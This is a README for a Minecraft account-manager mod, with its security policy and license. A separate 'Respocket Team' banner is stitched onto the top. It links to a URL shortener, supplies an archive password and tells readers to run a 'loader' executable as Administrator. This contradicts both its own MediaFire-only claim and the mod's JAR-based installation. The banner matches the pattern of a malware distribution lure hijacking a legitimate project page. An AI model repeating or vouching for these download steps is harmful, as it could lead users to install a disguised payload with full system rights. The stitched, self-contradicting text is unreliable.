<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

## Features

- Microsoft sign-in through the user's system browser
- Dedicated Account Manager interface in the Multiplayer screen
- Microsoft and Minecraft connection-status display
- Minecraft profile viewer with IGN, UUID and current skin preview
- Manual Minecraft profile refresh
- Minecraft IGN editor interface with local validation
- Skin PNG selection and validation
- 64x64 Minecraft skin preview
- Classic / Slim player model preview
- Minecraft skin upload integration through Minecraft Services
- Minecraft IGN change integration through Minecraft Services
- In-memory authentication state with stale-session protection
- Custom Account Manager UI and in-game branding

## Download

The recommended installation file is the normal release JAR:

## Minecraft Services Status

Account Manager's Microsoft Entra application has been approved for Minecraft Services access.

The standard Microsoft OAuth -> Xbox Live -> XSTS -> Minecraft Services flow has been successfully verified with Account Manager v1.0.1. Minecraft profile loading, IGN / UUID retrieval, skin uploading and Minecraft profile-name changes have been tested successfully after authorization was granted.

The mod uses its own Microsoft Entra public-client registration and does not use another launcher's Client ID or attempt to bypass Minecraft Services authorization.

## Installation

1. Install Minecraft: Java Edition **26.1.2**.
2. Install a compatible **Fabric Loader**.
3. Install **Fabric API** for the same Minecraft version.
4. Download the normal Account Manager JAR from this repository's **Releases** page.
5. Place the JAR inside your Minecraft instance's `mods` folder.
6. Launch Minecraft with the Fabric profile.

## Using Account Manager

Open:

`Multiplayer -> Account Manager`

From there you can sign in with Microsoft, inspect authentication status, open Profile Management, preview skins, validate Minecraft names, and refresh Minecraft profile information.

## Support & FAQ

### Is Minecraft Services access active?

Yes. Account Manager's Microsoft Entra application has been approved for Minecraft Services access. The profile flow and profile-management features have been re-tested successfully with v1.0.1.

### Which Minecraft version is supported?

Account Manager v1.0.1 is built for **Minecraft: Java Edition 26.1.2**.

### Do I need Fabric API?

Yes. Install **Fabric Loader** and **Fabric API** for Minecraft 26.1.2 before launching the mod.

### Which Java version do I need?

Use **Java 25 or newer** for this release.

### Which file should I download?

Download the normal release file:

`account-manager-1.0.1.jar`

Do not install a `-sources.jar` as the normal mod.

### Where do I report a bug?

Contact me directly on Discord: **@te5rontop**

Please include your Minecraft version, Fabric Loader version, Fabric API version, Java version, clear reproduction steps, and any relevant logs or screenshots. Never send Microsoft passwords, access tokens, refresh tokens, authorization codes, Xbox tokens, or XSTS tokens.

### Where do I request a feature?

Open the repository's **Issues** page and choose **Feature Request**.

### Is Account Manager affiliated with Mojang or Microsoft?

No. Account Manager is an independent community project and is not affiliated with, endorsed by, or sponsored by Mojang Studios, Microsoft, Xbox or Fabric.

## Security

Account Manager is designed as a public/native desktop OAuth client.

- Microsoft authentication is performed in the user's system browser.
- No client secret is embedded in the mod.
- Access tokens are intended to remain only in memory while Minecraft is running.
- Tokens are not intentionally displayed in the UI or written to local configuration files.
- Clearing the account state invalidates the current in-memory authentication session.
- Stale asynchronous authentication results are discarded after a new sign-in or account clear.
- Minecraft Services requests use bounded connection/request timeouts.

Never send Microsoft passwords, access tokens, refresh tokens, Xbox/XSTS tokens, or authorization codes to anyone claiming to provide support for this mod.

## Building from Source

Requirements:

- JDK 25
- Git
- A supported Gradle environment

Build with:

```bash
./gradlew build
```

On Windows PowerShell:

```powershell
.\gradlew.bat build
```

The compiled mod will be written to:

```text
build/libs/
```

## License

This repository is **source-available**, not OSI open source.

The source code is publicly visible for transparency, review and educational study, but modification, redistribution, reuploading, derivative works, substantial code reuse and commercial use are not permitted without explicit written permission from the copyright holder.

## Disclaimer

Account Manager is an independent community project and is **not affiliated with, endorsed by, or sponsored by Mojang Studios, Microsoft, Xbox, or Fabric**.

Minecraft is a trademark of Microsoft Corporation.

---

<div align="center">

Made by **te5r.**  
Discord: **@te5rontop**.

</div>


---

# Security Policy

## Supported Versions

Security fixes are provided for the latest published release of Account Manager.

| Version | Supported |
| --- | --- |
| 1.0.x | Yes |
| Older versions | No |

## Reporting a Vulnerability

Please do **not** open a public GitHub issue for vulnerabilities involving authentication, tokens, account access, OAuth, Xbox/XSTS authentication, Minecraft Services, or other sensitive behavior.

If GitHub's private vulnerability reporting option is available for this repository, use that method. Otherwise, contact the project author through the support/contact information listed in the repository README.

When reporting a vulnerability, include:

- A clear description of the issue
- The affected Account Manager version
- Minecraft, Fabric Loader, Fabric API, and Java versions
- Steps to reproduce the issue
- The expected and actual behavior
- Relevant logs or screenshots with sensitive values removed
- Any suggested mitigation, if known

## Sensitive Information

Never include any of the following in a report, screenshot, log, issue, or public message:

- Microsoft account passwords
- OAuth authorization codes
- Access tokens
- Refresh tokens
- Xbox Live tokens
- XSTS tokens
- Minecraft Services bearer tokens
- Session credentials or cookies
- Client secrets or private keys

If a credential is accidentally exposed, revoke or rotate it before continuing with the report.

## Scope

Security reports are especially useful for issues involving:

- Authentication or account-access flaws
- Accidental token logging or persistence
- Exposure of sensitive account information
- Unauthorized profile, skin, or name-management behavior
- Insecure handling of Microsoft OAuth or Minecraft Services responses
- Vulnerabilities caused by Account Manager's own code or bundled dependencies

Issues that only affect unsupported Minecraft versions, modified builds, unofficial forks, or third-party software outside Account Manager may be out of scope.

## Responsible Disclosure

Please allow reasonable time for investigation and a fix before publishing technical details about a confirmed vulnerability.

Account Manager is an independent community project and is not affiliated with Mojang Studios, Microsoft, Xbox, or Fabric.


---

Account Manager - Source Available License

Copyright (c) 2026 te5r. All Rights Reserved.

Permission is granted to view and study the source code of this software for personal and educational purposes.

You may use official, unmodified releases of Account Manager for personal use.

Without explicit written permission from the copyright holder, you may not:

- Modify or create derivative versions of this software.
- Redistribute or reupload this software or its source code.
- Distribute modified versions of this software.
- Copy substantial portions of the source code into another project.
- Sell, sublicense, or commercially exploit this software.
- Remove or alter copyright, attribution, or branding notices.

The source code is publicly visible for transparency and educational purposes. Public availability of the source code does not grant open-source rights.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE COPYRIGHT HOLDER BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Copyright (c) 2026 te5r.
